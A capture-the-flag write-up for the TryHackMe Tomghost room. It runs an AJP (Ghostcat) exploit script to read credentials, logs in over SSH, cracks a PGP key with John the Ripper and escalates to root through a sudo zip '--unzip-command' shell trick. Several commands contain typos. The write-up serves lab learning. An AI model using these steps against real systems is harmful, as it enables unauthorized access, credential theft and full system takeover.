# TryHackMe_Tomghost_Writeup
![Capture](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/b8adfb3c-9c53-4097-9ca9-d6185857011d)

### Step 1: Start Machine
### Step 2: User Login

	sudo nmap <ip>

![ss1](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/9a75db89-de4e-4e33-861b-0b62aa0d142b)

There are total 4 port open. Port 8009 run ajp13. Now I search in web ajp exploit and download exploit. Then run exploit, command:

	python ajpShooter.py htto://<ip>:8080 8009 /WEB-INF/web.xml read

![ss2](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/8bd8658e-20cd-46a7-baaf-409f66b1b322)

![ss3](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/7e014945-1688-49c2-987a-356dbcee75c3)

I found ssh username & password. Now login ssh, command:

	ssh skyfuck@<ip>
	id
	ls

![ss4](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/716ffb76-e553-4cd8-ac11-c9920e84f790)

I successfully login. Now:

	cd ..
	ls
	cd merlin
	ls
	cat user.txt

![ss5](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/4ef53c86-8e03-4b9d-b528-3bb2fabf7e43)

Found use flag.

Compromise this machine and obtain user.txt

	Ans: -------------------

### Step 3: Privilege Escalation

Download credential.pgp and tryhackme.asc file my machine. Command:

 	scp skyfuck@<ip>:/home/skyfuck/* .

![ss6](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/c8ebfaab-d7f4-4819-9532-13b96e3ca614)

	gpg2jhon tryhackme.acc > hash

![ss15](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/d653b9de-a5dd-4c62-929a-e448c2e7b632)


 	cat hash

![ss7](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/f73b2b00-7943-40cf-8ada-0fe51d7d1390)

Now creack hash using john tool. Command:

	john --wordlist=/usr/share/wordlists/rockyou.txt hash

![ss8](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/4bf39625-4539-4724-bfe4-0f11ddf41cbe)

 	gpg --import tryhackme.asc

![ss9](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/a03c7aa7-e114-4e27-aeeb-ddd2f5efd745)

	gpg --decrypt credential.pgp

![ss10](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/324e0d84-5bba-47eb-825c-4acd6d16f131)

Found another username and password. Now change user, command:

	su merlin

![ss11](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/d84a99d5-99fe-4538-a6b3-51a202db078c)

Now create a text file merlin directory.

	cd ..
	ls
	cd merlin
	ls
	touch 1337.txt
	ls
 
![ss12](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/2b595d21-e31e-42d0-a8a8-baec043bb032)

	sudo zip 1337.zip 1337.txt -T --unzip-command="sh -c /bin/hash"
	id

![ss13](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/31498335-400d-44f6-93e1-0a5ae64821fd)

Now login as root user. Found root flag.

	pwd
	cat /root/root.txt

![ss14](https://github.com/sayan-125/TryHackMe_Tomghost/assets/158836588/c4afc361-9dd5-435f-966b-db156a7154a4)

Escalate privileges and obtain root.txt

	Ans: -------------------
